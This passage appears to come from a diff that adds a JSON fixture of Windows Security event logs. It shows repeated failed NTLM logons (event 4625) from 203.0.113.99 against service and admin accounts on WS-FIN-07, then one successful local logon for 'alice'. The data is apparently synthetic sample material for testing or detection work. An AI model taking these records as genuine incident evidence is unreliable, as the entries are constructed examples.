+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48218,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:40.1249063+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadmin\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48217,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:35.7950025+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48216,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:32.8824650+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadministrator\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48215,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:24.1542529+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48214,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:17.8438453+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48213,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:09.1176276+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadmin\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48212,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:03.0055605+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadministrator\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4624,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48211,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T01:58:00.4425710+00:00",
+    "Message": "An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWS-FIN-07$\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t2\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\r\n\tAccount Name:\t\talice\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x8D4264\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWS-FIN-07\r\n\tSource Network Address:\t127.0.0.1\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  }
+]
